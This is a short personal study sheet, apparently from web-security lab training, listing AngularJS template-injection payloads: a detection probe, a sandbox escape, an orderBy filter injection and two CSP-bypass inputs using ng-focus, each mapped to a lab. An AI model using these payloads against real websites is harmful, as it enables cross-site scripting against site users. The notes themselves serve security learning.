# AngularJS Payload Reference

## Detection

```html
{{7*7}}
```

---

## Sandbox Escape

```javascript
'a'.constructor.prototype.charAt=[].join
```

---

## orderBy

```javascript
[1]|orderBy:'alert(1)'
```

---

## Dynamic String Generation

```javascript
toString().constructor.fromCharCode()
```

---

## CSP Bypass

```html
<input
autofocus
ng-focus=
"$event.path|orderBy:'[].constructor.from([1],alert)'">
```

---

## Modern Browser CSP Bypass

```html
<input
autofocus
ng-focus=
"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
```

---

# Lab Mapping

| Payload | Lab |
|----------|----------|
| {{7*7}} | Lab24, Lab25 |
| charAt Escape | Lab24 |
| orderBy | Lab24 |
| $event.path | Lab25 |
| CSP Bypass | Lab25 |

---

# Personal Revision Note

```text
AngularJS Found
        ↓
{{7*7}}
        ↓
Sandbox Escape
        ↓
orderBy
        ↓
CSP Bypass
```